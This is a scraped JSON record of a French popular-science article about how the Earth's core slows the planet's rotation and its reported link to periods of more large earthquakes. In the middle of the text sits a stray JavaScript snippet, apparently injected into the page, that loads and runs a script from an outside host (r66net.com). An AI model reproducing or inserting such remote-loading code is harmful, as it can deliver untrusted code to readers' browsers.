{"title": "Le noyau de la Terre serait responsable de seismes majeurs", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-11-02", "content": "Le noyau de la Terre ne se contenterait pas de generer son champ magnetique. En freinant la rotation de notre planete,  via  des interactions avec le manteau, il augmenterait periodiquement le nombre de grands seismes. Ce qu'il faut retenir La rotation de la Terre est un phenomene complexe, influence par l'attraction de la Lune et du Soleil mais qui depend aussi des modifications des repartitions des masses du globe terrestre et de sa structure interne. La duree du jour et l'axe de rotation de la Terre evoluent donc dans le temps, notamment a l'occasion de seismes et de modifications de l'etat de l'atmosphere et des oceans. Elle semble egalement liee a l'activite magnetique du noyau et a ses interactions avec le manteau. Une augmentation periodique du nombre de seismes de magnitudes superieures a 7 serait correlee a une augmentation de la duree du jour. Quoi de plus banal que la rotation de la Terre ? Pourtant, ce phenomene n'est pas si simple : l'axe de rotation de notre Planete n'est pas fixe au cours du temps et la  duree  du jour elle-meme varie. En etudiant et en cherchant a comprendre cela, mathematiciens, astronomes et geophysiciens sont alles de surprise en surprise depuis presque deux siecles. Axe et vitesse de rotation  sont d'abord influences par les forces de  gravite  de la  Lune  et du  Soleil  mais la facon dont la Terre repond a ces forces depend de sa structure interne et de la presence de ses oceans et de son  atmosphere . Au XIX e  siecle, il y a ainsi eu une controverse celebre sur le caractere fluide ou non de l'interieur de la Terre et sur le fait qu'il fallait ou non considerer celui-ci comme un  solide  indeformable ou, au minimum, comme un corps elastique. Laplace,  Kelvin  et  Poincare  se sont penches sur ces questions et il y eut, finalement, d'importants travaux a ce sujet, auxquelles sont associes les noms de  Chandler, Newcomb et Love , car la rotation de la Terre peut  nous renseigner sur sa structure. On sait en effet, depuis les travaux d' Euler  (a qui l'on doit des  equations  decrivant les  mouvements  de rotation des corps solides, voire elastiques), que la distribution et les mouvements des  masses  a l'interieur d'un objet comme la Terre influent sur sa rotation. Or, meme en considerant que la Terre n'est pas soumise aux forces d'autres corps celestes, distributions et mouvements peuvent varier, par exemple lors d'echanges du  moment cinetique  entre les differentes enveloppes ( atmosphere, ocean ,  manteau , etc.) ou simplement du fait d'une redistribution des masses a l'occasion de grands  seismes . De fait, la longueur du jour a change lors de grands tremblements de Terre, comme celui du  Chili  en 2010. Cette video montre, dans differents systemes de reference, les mouvements de l'axe geographique de la Terre (bleu) par rapport a son axe de rotation (orange) et inversement. Les amplitudes des mouvements sont tres exagerees. L'animation montre que l'axe de rotation de la Terre ne coupe pas sa surface toujours au meme endroit et qu'il oscille selon un mouvement de spirale autour de l'axe geographique ( Earth Reference Frame , en anglais dans la video). Ce mouvement est en realite plus irregulier. (c) Nasa,  GSFC Scientific Visualization Studio Des forces electromagnetiques entre le noyau et le manteau de la Terre ? Le XX e  siecle nous a appris que la Terre possedait un noyau en partie  liquide , parcouru par des  courants electriques  et des champs magnetiques. On pense qu'il y a des interactions entre le  noyau de la Terre  et son manteau depuis un moment, peut-etre par l'intermediaire de forces magnetiques qui agiraient sur certaines regions du manteau plus conductrices que d'autres et ou se trouvent des courants. On constate ainsi que certaines fluctuations tres courtes du  champ magnetique  de la Terre, appelees << des jerks >>, semblent etroitement correlees a des fluctuations tres courtes de la  vitesse  de rotation de la Terre. Une explication possible serait que, lors d'un jerk, un couplage local tres intense attache soudainement de la  matiere  du noyau au manteau, ce qui s'accompagne d'un transfert de moment cinetique et d'une modification du moment d' inertie .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Il se trouve que, lors d'un recent colloque de la  Geological Society of America , deux geophysiciens etats-uniens, Roger Bilham, de l'universite du Colorado (CU), a Boulder, et Rebecca Bendick, de l'universite du Montana, a Missoula, ont fait une communication qui a intrigue leurs collegues, dont le celebre Peter Molnar,  prix Crafoord  2014. Les deux chercheurs ont en effet annonce avoir decouvert une surprenante correlation entre des brusques ralentissements de la vitesse de rotation de la Terre affectant la duree du jour de quelques millisecondes et des augmentations du nombre de seismes superieurs a la  magnitude  7 dans les archives geophysiques des 100 dernieres annees. Ces grands seismes deviendraient un peu plus nombreux entre 5 et 6 ans apres un episode de ralentissement de la rotation de la Terre bien specifique qui semble lie au processus d'interaction manteau-noyau evoque precedemment. Cette augmentation serait presente pendant environ cinq ans. Ainsi, bien qu'il ne semble pas exister de causalite quant a la repartition spatiale de ces seismes, on pourrait toutefois predire l'occurrence de periodes << d' orages  sismiques >>. On ne devrait pas tarder a savoir si cela est possible car l'un des episodes de ralentissement de la rotation de la Terre decouvert par les deux geophysiciens s'est produit il y a quatre ans. Les chercheurs pensent que ce sont les forces et les  ondes sismiques  produites lors d'interactions entre le manteau et le noyau qui synchroniseraient en quelque sorte la liberation des contraintes presentes dans des regions sismiquement actives, un peu comme le phenomene de  synchronisation des pendules  de differentes periodes poses sur une table, decouvert il y a longtemps deja par le physicien Huygens. La sismologie, le stethoscope qui ecoute le coeur de la Terre                       << La Terre est opaque mais elle est transparente aux ondes sismiques >> nous explique Jean-Paul Montagner, chercheur a l'IPGP (Institut de physique du Globe de Paris), en preambule de cette video. Nous plongeons grace a elle dans les entrailles de la Terre, pour y observer sa structure et comprendre l'origine des seismes.                                       ", "theme": "planete"}